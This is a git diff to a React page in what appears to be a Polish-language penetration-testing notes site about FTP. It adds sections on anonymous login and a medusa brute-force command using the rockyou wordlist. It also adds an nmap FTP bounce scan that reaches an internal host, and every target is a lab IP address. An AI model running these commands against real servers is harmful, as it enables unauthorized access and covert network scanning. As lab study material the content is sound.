@@ -1,3 +1,7 @@
+import ftp_anonymous from '../../assets/ftp_anonymous.png';
+import ftp_bounce from '../../assets/ftp_bounce.png';
+import ExampleFrame from '../exampleFrame/ExampleFrame';
+
 const FTP = () =>{
     return(
         <section>
@@ -146,6 +150,27 @@ const FTP = () =>{
             <hr />
             <h2>FTP - TLS/SSL</h2>
             <h3>openssl s_client -connect 10.129.14.136:21 -starttls ftp</h3>
+
+            <hr />
+            <h2>Anonimowe logowanie</h2>
+            <ExampleFrame screen={ftp_anonymous} />
+
+            <hr />
+            <h2>Brute foce</h2>
+
+            <div className='waring'>
+                <p>medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp </p>
+            </div>
+
+            <hr />
+            <h2>Atak odbijający FTP</h2>
+
+            <ExampleFrame screen={ftp_bounce} />
+            <p>Skanowanie infrastruktury poprzez host</p>
+
+            <div className='waring'>
+                <p>nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2</p>
+            </div>
         </section>
     )
 }
